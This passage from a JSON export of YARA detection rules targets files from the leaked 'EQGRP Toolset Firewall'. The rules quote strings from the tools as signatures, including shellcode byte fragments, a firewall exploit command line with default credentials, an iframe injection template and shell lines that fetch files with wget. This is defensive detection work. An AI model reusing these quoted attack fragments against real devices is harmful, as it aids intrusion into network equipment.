\"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ERROR: failed to open %s: %d\" fullword ascii\n      $s2 = \"__libc_start_main@@GLIBC_2.0\" fullword ascii\n      $s3 = \"serial number: %s\" fullword ascii\n      $s4 = \"strerror@@GLIBC_2.0\" fullword ascii\n      $s5 = \"ERROR: mmap failed: %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and all of them )\n}","date":"2016-08-16 08:48:31","description":"EQGRP Toolset Firewall - file bo","minimum_yara":"1.7","name":"APT_EQGRP_bo_RID2B04","reference":"Research","required_modules":[],"rule_hash":"ce90861e83f3bd08475173409c8e65ea","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_SecondDate_2211_RID2F32 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file SecondDate-2211.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SD_processControlPacket\" fullword ascii\n      $s2 = \"Encryption_rc4SetKey\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"^GET.*(?:/ |\\\\.(?:htm|asp|php)).*\\\\r\\\\n\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}","date":"2016-08-16 11:46:51","description":"EQGRP Toolset Firewall - file SecondDate-2211.exe","minimum_yara":"1.7","name":"APT_EQGRP_SecondDate_2211_RID2F32","reference":"Research","required_modules":[],"rule_hash":"4980391841b856e9e16e9873e70586e2","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_config_jp1_UA_RID2F08 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file config_jp1_UA.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"This program will configure a JETPLOW Userarea file.\" fullword ascii\n      $x2 = \"Error running config_implant.\" fullword ascii\n      $x3 = \"NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION \" fullword ascii\n      $x4 = \"First IP address for beacon destination [127.0.0.1]\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 11:39:51","description":"EQGRP Toolset Firewall - file config_jp1_UA.pl","minimum_yara":"1.7","name":"APT_EQGRP_config_jp1_UA_RID2F08","reference":"Research","required_modules":[],"rule_hash":"8d4924e8e020a13f3b2e1e4d5e231864","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BBALL_M50FW08_2201_RID2ECA : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"LOADED\" fullword ascii\n      $s3 = \"pageTable.c\" fullword ascii\n      $s4 = \"_start_text\" fullword ascii\n      $s5 = \"handler_readBIOS\" fullword ascii\n      $s6 = \"KEEPGOING\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 5 of ( $s* ) )\n}","date":"2016-08-16 11:29:31","description":"EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe","minimum_yara":"1.7","name":"APT_EQGRP_BBALL_M50FW08_2201_RID2ECA","reference":"Research","required_modules":[],"rule_hash":"c88c2f9cdaf2fa9ef9a2bce3fdcc5d19","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_workit_RID2CD3 : APT DEMO T1105 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file workit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"macdef init > /tmp/.netrc;\" fullword ascii\n      $s2 = \"/usr/bin/wget http://\" fullword ascii\n      $s3 = \"HOME=/tmp ftp\" fullword ascii\n      $s4 = \" >> /tmp/.netrc;\" fullword ascii\n      $s5 = \"/usr/rapidstream/bin/tftp\" fullword ascii\n      $s6 = \"created shell_command:\" fullword ascii\n      $s7 = \"rm -f /tmp/.netrc;\" fullword ascii\n      $s8 = \"echo quit >> /tmp/.netrc;\" fullword ascii\n      $s9 = \"echo binary >> /tmp/.netrc;\" fullword ascii\n      $s10 = \"chmod 600 /tmp/.netrc;\" fullword ascii\n      $s11 = \"created cli_command:\" fullword ascii\n   condition: \n      6 of them\n}","date":"2016-08-16 10:05:41","description":"EQGRP Toolset Firewall - file workit.py","minimum_yara":"1.7","name":"APT_EQGRP_workit_RID2CD3","reference":"Research","required_modules":[],"rule_hash":"3cdddd5f4ee23019238eaed2d86cfa0e","score":75,"tags":["APT","DEMO","T1105"]},{"author":"Florian Roth","content":"rule APT_EQGRP_tinyhttp_setup_RID3047 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file tinyhttp_setup.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"firefox http://127.0.0.1:8000/$_name\" fullword ascii\n      $x2 = \"What is the name of your implant:\" fullword ascii\n      $x3 = \"killall thttpd\" fullword ascii\n      $x4 = \"copy http://<IP>:80/$_name flash:/$_name\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 2KB and 1 of ( $x* ) ) or ( all of them )\n}","date":"2016-08-16 12:33:01","description":"EQGRP Toolset Firewall - file tinyhttp_setup.sh","minimum_yara":"1.7","name":"APT_EQGRP_tinyhttp_setup_RID3047","reference":"Research","required_modules":[],"rule_hash":"f05e8b4242e4da5bf1460d42072387bb","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_shellcode_RID2DE6 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file shellcode.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"execute_post = '\\\\xe8\\\\x00\\\\x00\\\\x00\\\\x00\\\\x5d\\\\xbe\\\\xef\\\\xbe\\\\xad\\\\xde\\\\x89\\\\xf7\\\\x89\\\\xec\\\\x29\\\\xf4\\\\xb8\\\\x03\\\\x00\\\\x00\\\\x00\" ascii\n      $s2 = \"tiny_exec = '\\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x01\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x03\\\\x00\\\\x01\\\\x00\\\\x00\" ascii\n      $s3 = \"auth_id = '\\\\x31\\\\xc0\\\\xb0\\\\x03\\\\x31\\\\xdb\\\\x89\\\\xe1\\\\x31\\\\xd2\\\\xb6\\\\xf0\\\\xb2\\\\x0d\\\\xcd\\\\x80\\\\x3d\\\\xff\\\\xff\\\\xff\\\\xff\\\\x75\\\\x07\" ascii\n      $c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 } \n      $c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 } \n   condition: \n      1 of them\n}","date":"2016-08-16 10:51:31","description":"EQGRP Toolset Firewall - file shellcode.py","minimum_yara":"1.7","name":"APT_EQGRP_shellcode_RID2DE6","reference":"Research","required_modules":[],"rule_hash":"49ce5d8476c4b999f6e35bb059d362c6","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_EPBA_RID2B4B : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file EPBA.script\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 \" fullword ascii\n      $x2 = \"-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP\" fullword ascii\n      $x3 = \"./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP\" fullword ascii\n      $x4 = \"--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)\" fullword ascii\n      $x5 = \"-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port\" fullword ascii\n      $x6 = \"this operation is complete, BananaGlee will\" fullword ascii\n      $x7 = \"cd /current/bin/FW/BGXXXX/Install/LP\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2023 and filesize < 7KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-08-16 09:00:21","description":"EQGRP Toolset Firewall - file EPBA.script","minimum_yara":"1.7","name":"APT_EQGRP_EPBA_RID2B4B","reference":"Research","required_modules":[],"rule_hash":"ca90782a116c335cf29a738146018259","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BPIE_RID2B53 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BPIE-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"profProcessPacket\" fullword ascii\n      $s2 = \".got_loader\" fullword ascii\n      $s3 = \"getTimeSlotCmdHandler\" fullword ascii\n      $s4 = \"getIpIpCmdHandler\" fullword ascii\n      $s5 = \"LOADED\" fullword ascii\n      $s6 = \"profStartScan\" fullword ascii\n      $s7 = \"tmpData.1\" fullword ascii\n      $s8 = \"resetCmdHandler\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 6 of ( $s* ) )\n}","date":"2016-08-16 09:01:41","description":"EQGRP Toolset Firewall - file BPIE-2201.exe","minimum_yara":"1.7","name":"APT_EQGRP_BPIE_RID2B53","reference":"Research","required_modules":[],"rule_hash":"89181d624030f60cda8ded63d04125d6","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_jetplow_SH_RID2E32 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file jetplow.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow\" fullword ascii\n      $s2 = \"***** Please place your UA in /current/bin/FW/OPS *****\" fullword ascii\n      $s3 = \"ln -s ../jp/orig_code.bin orig_code_pixGen.bin\" fullword ascii\n      $s4 = \"*****             Welcome to JetPlow              *****\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 11:04:11","description":"EQGRP Toolset Firewall - file jetplow.sh","minimum_yara":"1.7","name":"APT_EQGRP_jetplow_SH_RID2E32","reference":"Research","required_modules":[],"rule_hash":"3879f43ed991cc40dc0095c98b2059da","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BBANJO_RID2BDF : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBANJO-3011.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"get_lsl_interfaces\" fullword ascii\n      $s2 = \"encryptFC4Payload\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"beacon_getconfig\" fullword ascii\n      $s5 = \"LOADED\" fullword ascii\n      $s6 = \"FormBeaconPacket\" fullword ascii\n      $s7 = \"beacon_reconfigure\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )\n}","date":"2016-08-16 09:25:01","description":"EQGRP Toolset Firewall - file BBANJO-3011.exe","minimum_yara":"1.7","name":"APT_EQGRP_BBANJO_RID2BDF","reference":"Research","required_modules":[],"rule_hash":"cfa5dedbe2cebe0bf69b3a7f1893030b","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BPATROL_2201_RID2D6B : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BPATROL-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dumpConfig\" fullword ascii\n      $s2 = \"getstatusHandler\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"xtractdata\" fullword ascii\n      $s5 = \"KEEPGOING\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )\n}","date":"2016-08-16 10:31:01","description":"EQGRP Toolset Firewall - file BPATROL-2201.exe","minimum_yara":"1.7","name":"APT_EQGRP_BPATROL_2201_RID2D6B","reference":"Research","required_modules":[],"rule_hash":"9e1cb52fe08587705d4e210ef3f37cd0","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_extrabacon_RID2E5A : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"To disable password checking on target:\" fullword ascii\n      $x2 = \"[-] target is running\" fullword ascii\n      $x3 = \"[-] problem importing version-specific shellcode from\" fullword ascii\n      $x4 = \"[+] importing version-specific shellcode\" fullword ascii\n      $s5 = \"[-] unsupported target version, abort\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 11:10:51","description":"EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py","minimum_yara":"1.7","name":"APT_EQGRP_extrabacon_RID2E5A","reference":"Research","required_modules":[],"rule_hash":"962c67327ad32f344713237f8b1ef52f","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BICECREAM_RID2CAE : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BICECREAM-2140\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Could not connect to target device: %s:%d. Please check IP address.\" fullword ascii\n      $s2 = \"command data size is invalid for an exec cmd\" fullword ascii\n      $s3 = \"A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma\" ascii\n      $s4 = \"Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]\" fullword ascii\n      $s5 = \"Execute 0x%08x with args (%08x, %08x, %08x): [y/n]\" fullword ascii\n      $s6 = \"[%d] Execute code.\" fullword ascii\n      $s7 = \"Execute 0x%08x with args (%08x): [y/n]\" fullword ascii\n      $s8 = \"dump_value_LHASH_DOALL_ARG\" fullword ascii\n      $s9 = \"Eggcode is complete. Pass execution to it? [y/n]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them ) or ( 5 of them )\n}","date":"2016-08-16 09:59:31","description":"EQGRP Toolset Firewall - file BICECREAM-2140","minimum_yara":"1.7","name":"APT_EQGRP_BICECREAM_RID2CAE","reference":"Research","required_modules":[],"rule_hash":"2e12f1c7de4d5b14113b639d8c81a5d6","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_create_http_injection_RID32E8 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file create_http_injection.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 14:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"required by SECONDDATE\" fullword ascii\n      $s1 = \"help='Output file name (optional). By default the resulting data is written to stdout.')\" fullword ascii\n      $s2 = \"data = '<html><body onload=\\\"location.reload(true)\\\"><iframe src=\\\"%s\\\" height=\\\"1\\\" width=\\\"1\\\" scrolling=\\\"no\\\" frameborder=\\\"\" ascii\n      $s3 = \"version='%prog 1.0',\" fullword ascii\n      $s4 = \"usage='%prog [ ... options ... ] url',\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )\n}","date":"2016-08-16 14:25:11","description":"EQGRP Toolset Firewall - file create_http_injection.py","minimum_yara":"1.7","name":"APT_EQGRP_create_http_injection_RID32E8","reference":"Research","required_modules":[],"rule_hash":"30c5f17a31115d9bf3ec176894765b38","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BFLEA_2201_RID2CB1 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BFLEA-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"LOADED\" fullword ascii\n      $s3 = \"readFlashHandler\" fullword ascii\n      $s4 = \"KEEPGOING\" fullword ascii\n      $s5 = \"flashRtnsPix6x.c\" fullword ascii\n      $s6 = \"fix_ip_cksum_incr\" fullword ascii\n      $s7 = \"writeFlashHandler\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 5 of them ) or ( all of them )\n}","date":"2016-08-16 10:00:01","description":"EQGRP Toolset Firewall - file BFLEA-2201.exe","minimum_yara":"1.7","name":"APT_EQGRP_BFLEA_2201_RID2CB1","reference":"Research","required_modules":[],"rule_hash":"d2e7e34a5f431f1a059a8276e563f30a","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BpfCreator_RHEL4_RID2FD9 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BpfCreator-RHEL4\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"usage %s \\\"<tcpdump pcap string>\\\" <outfile>\" fullword ascii\n      $s2 = \"error reading dump file: %s\" fullword ascii\n      $s3 = \"truncated dump file; tried to read %u captured bytes, only got %lu\" fullword ascii\n      $s4 = \"%s: link-layer type %d isn't supported in savefiles\" fullword ascii\n      $s5 = \"DLT %d is not one of the DLTs supported by this device\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and all of them )\n}","date":"2016-08-16 12:14:41","description":"EQGRP Toolset Firewall - file BpfCreator-RHEL4","minimum_yara":"1.7","name":"APT_EQGRP_BpfCreator_RHEL4_RID2FD9","reference":"Research","required_modules":[],"rule_hash":"147bc90bc93754d48cc794c96c8236f6","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_StoreFc_RID2CE9 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file StoreFc.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf\" ascii\n      $x2 = \"raise Exception, \\\"Must supply both a config file and implant file.\\\"\" fullword ascii\n      $x3 = \"This is wrapper for Store.py that FELONYCROWBAR will use. This\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-08-16 10:09:21","description":"EQGRP Toolset Firewall - file StoreFc.py","minimum_yara":"1.7","name":"APT_EQGRP_StoreFc_RID2CE9","reference":"Research","required_modules":[],"rule_hash":"210b02d6530b8718fffa89ad530fcd0d","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_hexdump_RID2D2E : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file hexdump.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:20:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"def hexdump(x,lead=\\\"[+] \\\",out=sys.stdout):\" fullword ascii\n      $s2 = \"print >>out, \\\"%s%04x  \\\" % (lead,i),\" fullword ascii\n      $s3 = \"print >>out, \\\"%02X\\\" % ord(x[i+j]),\" fullword ascii\n      $s4 = \"print >>out, sane(x[i:i+16])\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 1KB and 2 of ( $s* ) ) or ( all of them )\n}","date":"2016-08-16 10:20:51","description":"EQGRP Toolset Firewall - file hexdump.py","minimum_yara":"1.7","name":"APT_EQGRP_hexdump_RID2D2E","reference":"Research","required_modules":[],"rule_hash":"38a52d2892755d6c5d269008b20a1377","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BBALL_RID2B90 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S\" fullword ascii\n      $s2 = \".got_loader\" fullword ascii\n      $s3 = \"handler_readBIOS\" fullword ascii\n      $s4 = \"cmosReadByte\" fullword ascii\n      $s5 = \"KEEPGOING\" fullword ascii\n      $s6 = \"checksumAreaConfirmed.0\" fullword ascii\n      $s7 = \"writeSpeedPlow.c\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 4 of ( $s* ) ) or ( all of them )\n}","date":"2016-08-16 09:11:51","description":"EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe","minimum_yara":"1.7","name":"APT_EQGRP_BBALL_RID2B90","reference":"Research","required_modules":[],"rule_hash":"e5ff07052dc73cccc612b4a13a592e4e","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BARPUNCH_BPICKER_RID2EE5 : APT DEMO FILE T1083 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u\" fullword ascii\n      $x2 = \"%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]\" fullword ascii\n      $x3 = \"* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)\" fullword ascii\n      $x4 = \"%s version %s already has persistence installed. If you want to uninstall,\" fullword ascii\n      $x5 = \"The active module(s) on the target are not meant to be persisted\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )\n}","date":"2016-08-16 11:34:01","description":"EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100","minimum_yara":"1.7","name":"APT_EQGRP_BARPUNCH_BPICKER_RID2EE5","reference":"Research","required_modules":[],"rule_hash":"b1c6840d77de5a0af6134d5438661e49","score":75,"tags":["APT","DEMO","T1083","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen6_RID2F2A : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information\" fullword ascii\n      $s2 = \"LP.c:pixSecurity - Not in Session\" fullword ascii\n      $s3 = \"getModInterface__preloadedModules\" fullword ascii\n      $s4 = \"showCommands\" fullword ascii\n      $s5 = \"readModuleInterface\" fullword ascii\n      $s6 = \"Wrapping_Not_Necessary_Or_Wrapping_Ok\" fullword ascii\n      $s7 = \"Get_CMD_List\" fullword ascii\n      $s8 = \"LP_Listen2\" fullword ascii\n      $s9 = \"killCmdList\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and all of them )\n}","date":"2016-08-16 11:45:31","description":"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen6_RID2F2A","reference":"Research","required_modules":[],"rule_hash":"389e11e9aec54aff67796e7e077132d5","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Module and Implant versions do not match.  This module is not compatible with the target implant\" fullword ascii\n      $s1 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log\" 